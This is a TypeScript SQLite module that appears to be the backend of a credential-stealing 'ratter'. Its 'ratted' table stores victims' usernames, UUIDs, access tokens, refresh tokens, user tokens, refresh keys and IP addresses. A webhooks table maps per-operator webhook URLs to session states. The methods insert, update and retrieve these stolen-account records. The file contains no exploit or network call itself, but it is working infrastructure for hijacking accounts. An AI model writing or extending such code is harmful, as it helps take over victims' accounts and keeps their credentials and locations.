import sqlite3 from "sqlite3";
import { logger } from ".";
import { RattedSchema, WebhookSchema } from "./types";
import fs from "fs";

const sqlite = sqlite3.verbose();

export class Database {
    private database: sqlite3.Database;

    connect(): void {        

        const dbFile = fs.realpathSync("./db/sqlite.db");

        if (!fs.existsSync(dbFile)) {
            fs.writeFileSync(dbFile, "");
        }

        this.database = new sqlite.Database(dbFile, (error: any) => {
            if (error) {
                throw new Error(error.message);
            }
        })

        logger.log("Successfully connected to sqlite database!");

        this.database.run(`CREATE TABLE IF NOT EXISTS ratted (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            uuid TEXT NOT NULL,
            token TEXT NOT NULL,
            refreshToken TEXT NOT NULL,
            userToken TEXT NOT NULL,
            refreshKey TEXT NOT NULL,
            ip TEXT NOT NULL,
            date TEXT NOT NULL,
            state TEXT NOT NULL
        )`)

        this.database.run(`CREATE TABLE IF NOT EXISTS webhooks (
            id INTEGER PRIMARY KEY,
            webhook TEXT,
            userid TEXT UNIQUE,
            date TEXT,
            state TEXT
        )`)

        logger.log("Successfully created tables!");
    }

    async insertRattedUser(data: RattedSchema): Promise<void> {
        const { username, uuid, token, refreshToken, userToken, refreshKey, ip, date, state } = data;
    
        this.database.serialize(() => {
            this.database.run(
            `INSERT INTO ratted 
            (username, uuid, token, refreshToken, userToken, refreshKey, ip, date, state) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [username, uuid, token, refreshToken, userToken, refreshKey, ip, date, state],
            (err) => {
                if (err) {
                    throw new Error(err.message);
                }
            })
        })
    }

    async updateRattedUser(data: RattedSchema): Promise<void> {
        const { username, uuid, token, refreshToken, userToken, refreshKey, ip, date } = data;

        this.database.serialize(() => {
            this.database.run(
            `UPDATE ratted
            SET username = ?, uuid = ?, token = ?, refreshToken = ?, userToken = ?, refreshKey = ?, ip = ?, date = ?
            WHERE uuid = ?`,
            [username, uuid, token, refreshToken, userToken, refreshKey, ip, date, uuid],
            (err) => {
                if (err) {
                    throw new Error(err.message);
                }
            })
        })
    }

    async updateRattedUserFromRefreshKey(data: RattedSchema): Promise<void> {
        const { username, uuid, token, refreshToken, userToken, refreshKey, ip, date } = data;

        this.database.serialize(() => {
            this.database.run(
            `UPDATE ratted
            SET username = ?, uuid = ?, token = ?, refreshToken = ?, userToken = ?, refreshKey = ?, ip = ?, date = ?
            WHERE refreshKey = ?`,
            [username, uuid, token, refreshToken, userToken, refreshKey, ip, date, refreshKey],
            (err: any) => {
                if (err) {
                    throw new Error(err.message);
                }
            })
        })
    }

    async findRattedUser(uuid: string): Promise<RattedSchema> {
        return new Promise((resolve) => {
            this.database.serialize(() => {
                this.database.get(`SELECT * FROM ratted WHERE uuid = ?`, [uuid], (err: any, row: any) => {
                    if (err) {
                        resolve(null);
                    } else if (!row) {
                        resolve(null);
                    } else {
                        resolve(row);
                    }
                })
            })
        })
    }

    async findRattedUserByRefreshKey(refreshKey: string): Promise<RattedSchema> {
        return new Promise((resolve) => {
            this.database.serialize(() => {
                this.database.get(`SELECT * FROM ratted WHERE refreshKey = ?`, [refreshKey], (err: any, row: any) => {
                    if (err) {
                        resolve(null);
                    } else if (!row) {
                        resolve(null);
                    } else {
                        resolve(row);
                    }
                })
            })
        })
    }

    upsertWebhook(data: WebhookSchema): void {
        const { webhook, userid, date, state } = data;

        this.database.serialize(() => {
            this.database.run(`INSERT INTO webhooks
            (webhook, userid, date, state)
            VALUES (?, ?, ?, ?)
            ON CONFLICT(userid) DO UPDATE SET webhook = ?, date = ?, state = ?`,
            [webhook, userid, date, state, webhook, date, state],
            (err: any) => {
                if (err) {
                    throw new Error(err.message);
                }
            })
        })
    }
    
    getWebhookByState(state: string): Promise<string> {
        return new Promise((resolve) => {
            this.database.serialize(() => {
                this.database.get(`SELECT webhook FROM webhooks WHERE state = ?`, [state], (err: any, row: any) => {
                    if (err) {
                        resolve(null);
                    } else if (!row) {
                        resolve(null);
                    } else {
                        resolve(row.webhook);
                    }
                })
            })
        })
    }

    transformDatabaseOutput(output: any): RattedSchema {
        return {
            username: output.username,
            uuid: output.uuid,
            token: output.token,
            refreshToken: output.refreshToken,
            userToken: output.userToken,
            refreshKey: output.refreshKey,
            ip: output.ip,
            date: parseFloat(output.date),
            state: output.state
        }
    }

    close() {
        this.database.close();
    }
}
